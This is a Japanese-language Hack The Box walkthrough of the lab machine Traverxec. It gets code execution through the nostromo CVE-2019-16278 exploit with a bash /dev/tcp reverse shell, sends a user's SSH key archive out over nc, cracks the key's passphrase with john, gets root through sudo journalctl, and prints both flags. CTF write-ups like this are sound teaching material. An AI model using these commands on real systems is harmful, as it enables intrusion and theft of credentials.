https://app.hackthebox.com/machines/Traverxec

## STEP 1
```sh
└─$ rustscan -a 10.129.182.22 --scripts none
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Scanning ports: The virtual equivalent of knocking on doors.

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.129.182.22:22
Open 10.129.182.22:80
10.129.182.22 -> [22,80]
```


## STEP 2
80番にアクセス
<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Traverxec_01.png">  
ヘッダを確認すると、nostromo 1.9.6 だと判明
```sh
└─$ curl -I http://10.129.182.22
HTTP/1.1 200 OK
Date: Mon, 21 Jul 2025 13:32:12 GMT
Server: nostromo 1.9.6
Connection: close
Last-Modified: Fri, 25 Oct 2019 21:11:09 GMT
Content-Length: 15674
Content-Type: text/html
```
nostromo 1.9.6 は、cve-2019-16278 が存在しrceの脆弱性がある  
PoC を確認
```sh
└─$ searchsploit -m 47837
  Exploit: nostromo 1.9.6 - Remote Code Execution
      URL: https://www.exploit-db.com/exploits/47837
     Path: /usr/share/exploitdb/exploits/multiple/remote/47837.py
    Codes: CVE-2019-16278
 Verified: True
File Type: Python script, ASCII text executable
Copied to: /home/kali/47837.py
```
PoC実行、python3.13では、エラーがでた  
`soc.send(payload)`を`soc.send(payload.encode('utf-8'))`に変更すると実行できた
```sh
└─$ python3.13 47837.py                                                                                
/home/kali/47837.py:20: SyntaxWarning: invalid escape sequence '\ '
  _____  _______    ______   _____\    \


                                        _____-2019-16278
        _____  _______    ______   _____\       _____\    \_\      |  |      | /    / |    |
  /     /|     ||     /  /     /|/    /  /___/|
 /     / /____/||\    \  \    |/|    |__ |___|/
|     | |____|/ \ \    \ |    | |       |     |  _____   \|     \|    | |     __/ __
|\     \|\    \   |\         /| |\    \  /  | \_____\|    |   | \_______/ | | \____\/    |
| |     /____/|    \ |     | /  | |    |____/|
 \|_____|    ||     \|_____|/    \|____|   | |
        |____|/                        |___|/





Usage: cve2019-16278.py <Target_IP> <Target_Port> <Command>

└─$ python3.13 47837.py 10.129.182.22 80 '/bin/bash -c "/bin/bash -i >& /dev/tcp/10.10.16.7/4444 0>&1"'
/home/kali/47837.py:20: SyntaxWarning: invalid escape sequence '\ '
  _____  _______    ______   _____\    \


                                        _____-2019-16278
        _____  _______    ______   _____\       _____\    \_\      |  |      | /    / |    |
  /     /|     ||     /  /     /|/    /  /___/|
 /     / /____/||\    \  \    |/|    |__ |___|/
|     | |____|/ \ \    \ |    | |       |     |  _____   \|     \|    | |     __/ __
|\     \|\    \   |\         /| |\    \  /  | \_____\|    |   | \_______/ | | \____\/    |
| |     /____/|    \ |     | /  | |    |____/|
 \|_____|    ||     \|_____|/    \|____|   | |
        |____|/                        |___|/




Traceback (most recent call last):
  File "/home/kali/47837.py", line 68, in <module>
    cve(target, port, cmd)
    ~~~^^^^^^^^^^^^^^^^^^^
  File "/home/kali/47837.py", line 54, in cve
    soc.send(payload)
    ~~~~~~~~^^^^^^^^^
TypeError: a bytes-like object is required, not 'str'

└─$ python3.13 47837.py 10.129.182.22 80 '/bin/bash -c "/bin/bash -i >& /dev/tcp/10.10.16.7/4444 0>&1"'
/home/kali/47837.py:20: SyntaxWarning: invalid escape sequence '\ '
  _____  _______    ______   _____\    \


                                        _____-2019-16278
        _____  _______    ______   _____\       _____\    \_\      |  |      | /    / |    |
  /     /|     ||     /  /     /|/    /  /___/|
 /     / /____/||\    \  \    |/|    |__ |___|/
|     | |____|/ \ \    \ |    | |       |     |  _____   \|     \|    | |     __/ __
|\     \|\    \   |\         /| |\    \  /  | \_____\|    |   | \_______/ | | \____\/    |
| |     /____/|    \ |     | /  | |    |____/|
 \|_____|    ||     \|_____|/    \|____|   | |
        |____|/                        |___|/

```
リバースシェル取得！がユーザフラグすら権限がたりない状況
```sh
└─$ nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.10.16.7] from (UNKNOWN) [10.129.182.22] 44468
bash: cannot set terminal process group (761): Inappropriate ioctl for device
bash: no job control in this shell
www-data@traverxec:/usr/bin$ python -c 'import pty; pty.spawn("/bin/bash")'
python -c 'import pty; pty.spawn("/bin/bash")'

www-data@traverxec:/usr/bin$ ^Z
zsh: suspended  nc -lnvp 4444

└─$ stty raw -echo; fg
[1]  + continued  nc -lnvp 4444
                               ^C

www-data@traverxec:/usr/bin$ export SHELL=bash

www-data@traverxec:/usr/bin$ export TERM=xterm-256color

www-data@traverxec:/usr/bin$ stty rows 66 columns 236

www-data@traverxec:/usr/bin$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

www-data@traverxec:/usr/bin$ ls -l /home
total 4
drwx--x--x 5 david david 4096 Oct 25  2019 david

www-data@traverxec:/usr/bin$ cat /home/david/user.txt
cat: /home/david/user.txt: Permission denied
```


## STEP 3
webの設定コンフィグっぽいものを発見  
[マニュアル](https://www.gsp.com/cgi-bin/man.cgi?section=8&topic=NHTTPD#HOMEDIRS)を参照  
ユーザのホームディレクトリをhttp経由で確認するために、homedirsオプションで`/home`を指定  
しかしユーザのホームディレクトリを全公開しないように、homedirs_publicオプションでサブディレクトリ`public_www`だけにアクセスを制限しているっぽい  
```sh
www-data@traverxec:/usr/bin$ cat /var/nostromo/conf/nhttpd.conf
# MAIN [MANDATORY]

servername              traverxec.htb
serverlisten            *
serveradmin             david@traverxec.htb
serverroot              /var/nostromo
servermimes             conf/mimes
docroot                 /var/nostromo/htdocs
docindex                index.html

# LOGS [OPTIONAL]

logpid                  logs/nhttpd.pid

# SETUID [RECOMMENDED]

user                    www-data

# BASIC AUTHENTICATION [OPTIONAL]

htaccess                .htaccess
htpasswd                /var/nostromo/conf/.htpasswd

# ALIASES [OPTIONAL]

/icons                  /var/nostromo/icons

# HOMEDIRS [OPTIONAL]

homedirs                /home
homedirs_public         public_www
```
以上のことから、ユーザホームディレクトリ内にpublic_wwwがあるとわかるので、「/home/david/public_www」を確認  
「index.html」などを発見
```sh
www-data@traverxec:/usr/bin$ cd /home/david/public_www

www-data@traverxec:/home/david/public_www$ ls -l
total 8
-rw-r--r-- 1 david david  402 Oct 25  2019 index.html
drwxr-xr-x 2 david david 4096 Oct 25  2019 protected-file-area
```
[マニュアル](https://www.gsp.com/cgi-bin/man.cgi?section=8&topic=NHTTPD#HOMEDIRS)から、ユーザホームディレクトリにアクセスする場合は、「/~`ユーザ名`」と判明  
さきほどの「index.html」にアクセスできた  
<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Traverxec_02.png">  
さらにssh鍵のバックアップを発見、ncコマンドで配送
```sh
www-data@traverxec:/home/david/public_www$ ls -l protected-file-area
total 4
-rw-r--r-- 1 david david 1915 Oct 25  2019 backup-ssh-identity-files.tgz

www-data@traverxec:/home/david/public_www$ cat protected-file-area/backup-ssh-identity-files.tgz | nc 10.10.16.7 80
```
ssh秘密鍵でログイン、がパスフレーズがあるもよう
```sh
└─$ nc -lnvp 80 > backup-identity-files.tgz                                                               
listening on [any] 80 ...
connect to [10.10.16.7] from (UNKNOWN) [10.129.182.22] 48636
^C

└─$ tar -zxvf backup-identity-files.tgz 
home/david/.ssh/
home/david/.ssh/authorized_keys
home/david/.ssh/id_rsa
home/david/.ssh/id_rsa.pub

└─$ ssh -i home/david/.ssh/id_rsa david@10.129.182.22 
Enter passphrase for key 'home/david/.ssh/id_rsa': 
```
クラック成功！パスフレーズは「hunter」と判明  
opensslでパスフレーズを解除
```sh
└─$ ssh2john home/david/.ssh/id_rsa > passphrase.txt

└─$ john passphrase.txt            
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 2 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst
hunter           (home/david/.ssh/id_rsa)     
1g 0:00:00:00 DONE 2/3 (2025-07-20 16:36) 14.28g/s 822885p/s 822885c/s 822885C/s frodo..maverick
Use the "--show" option to display all of the cracked passwords reliably

└─$ openssl rsa -in home/david/.ssh/id_rsa -out id_rsa_david
Enter pass phrase for home/david/.ssh/id_rsa:
writing RSA key
```
sshログイン成功！ユーザフラグゲット！
```sh                                                                                                                                                                                                                                       
└─$ ssh -i id_rsa_david david@10.129.182.22 
Linux traverxec 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u1 (2019-09-20) x86_64
Last login: Tue Jul 22 07:28:13 2025 from 10.10.16.7

david@traverxec:~$ cat user.txt
9b8f2aa8b8a66e8f6716f393074cbf46
```


## STEP 4
sudo確認はパスワードがいるもよう
```sh
david@traverxec:~$ sudo -l
[sudo] password for david:
```
なぞのシェルスクリプトがあり確認してみると、sudoでなにか実行している模様
```sh
david@traverxec:~$ ls -a
.  ..  .bash_history  .bash_logout  .bashrc  bin  .lesshst  .profile  public_www  .ssh  user.txt

david@traverxec:~$ ls -a bin
.  ..  server-stats.head  server-stats.sh

david@traverxec:~$ cat bin/server-stats.sh
#!/bin/bash

cat /home/david/bin/server-stats.head
echo "Load: `/usr/bin/uptime`"
echo " "
echo "Open nhttpd sockets: `/usr/bin/ss -H sport = 80 | /usr/bin/wc -l`"
echo "Files in the docroot: `/usr/bin/find /var/nostromo/htdocs/ | /usr/bin/wc -l`"
echo " "
echo "Last 5 journal log lines:"
/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat
```
sudoを実行すると、パスワードが求められなかった  
多分`-n5`は５行文を出力するオプション  
パイプ以降を抜いて実行しても、これもパスワードが求められなかった
```sh
david@traverxec:~$ /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat
-- Logs begin at Mon 2025-07-21 08:56:43 EDT, end at Tue 2025-07-22 08:11:30 EDT. --
Jul 22 01:46:08 traverxec nhttpd[1536]: /../../../../bin/sh sent a bad cgi header
Jul 22 01:46:31 traverxec nhttpd[1538]: /../../../../bin/sh sent a bad cgi header
Jul 22 01:50:58 traverxec nhttpd[1547]: /../../../../bin/sh sent a bad cgi header
Jul 22 01:51:22 traverxec nhttpd[1549]: /../../../../bin/sh sent a bad cgi header
Jul 22 02:05:56 traverxec nhttpd[1554]: /../../../../bin/sh sent a bad cgi header

david@traverxec:~$ /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service
-- Logs begin at Mon 2025-07-21 08:56:43 EDT, end at Tue 2025-07-22 08:13:58 EDT. --                                      
Jul 22 01:46:08 traverxec nhttpd[1536]: /../../../../bin/sh sent a bad cgi header                                         
Jul 22 01:46:31 traverxec nhttpd[1538]: /../../../../bin/sh sent a bad cgi header                                         
Jul 22 01:50:58 traverxec nhttpd[1547]: /../../../../bin/sh sent a bad cgi header                                         
Jul 22 01:51:22 traverxec nhttpd[1549]: /../../../../bin/sh sent a bad cgi header                                         
Jul 22 02:05:56 traverxec nhttpd[1554]: /../../../../bin/sh sent a bad cgi header 
```
５行文がターミナルに出力されるが、そのサイズより小さいとjournalctlは`less`コマンドに渡されるかも  
ビンゴ！  
<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Traverxec_03.png">  
あとは、[リンク](https://gtfobins.github.io/gtfobins/journalctl/#sudo)どおりにシェルを開けた、ルートフラグゲット！
```sh
!/bin/sh
# id
uid=0(root) gid=0(root) groups=0(root)
                                                                                                          
# cat /root/root.txt                                                                                                                                
3ee17ab5224f06e14897ce20320f8665
```
